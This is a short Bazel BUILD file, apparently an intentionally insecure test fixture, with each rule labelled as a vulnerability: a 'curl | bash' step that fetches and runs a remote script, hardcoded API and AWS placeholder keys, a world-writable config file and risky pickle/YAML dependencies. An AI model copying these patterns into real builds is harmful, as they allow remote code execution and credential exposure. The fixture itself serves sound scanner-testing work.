# Root BUILD file with security issues

load("@rules_python//python:defs.bzl", "py_binary", "py_library")

# VULNERABILITY: World-writable output directory
genrule(
    name = "generate_config",
    outs = ["config.json"],
    cmd = """
        echo '{"api_key": "hardcoded_key_12345"}' > $@
        chmod 666 $@
    """,
    visibility = ["//visibility:public"],
)

# VULNERABILITY: Executing external script
genrule(
    name = "run_external",
    outs = ["external_output.txt"],
    cmd = "curl -s http://example.com/script.sh | bash > $@",
    visibility = ["//visibility:public"],
)

# VULNERABILITY: Hardcoded credentials in build
py_binary(
    name = "deploy",
    srcs = ["deploy.py"],
    data = [":config"],
    env = {
        "AWS_ACCESS_KEY": "AKIAIOSFODNN7EXAMPLE",
        "AWS_SECRET_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    },
)

# VULNERABILITY: Using deprecated/vulnerable dependencies
py_library(
    name = "app",
    srcs = glob(["**/*.py"]),
    deps = [
        "@pip//pyyaml:pkg",  # May use unsafe loader
        "@pip//requests:pkg",
        "@pip//pickle5:pkg",  # Pickle is dangerous
    ],
)
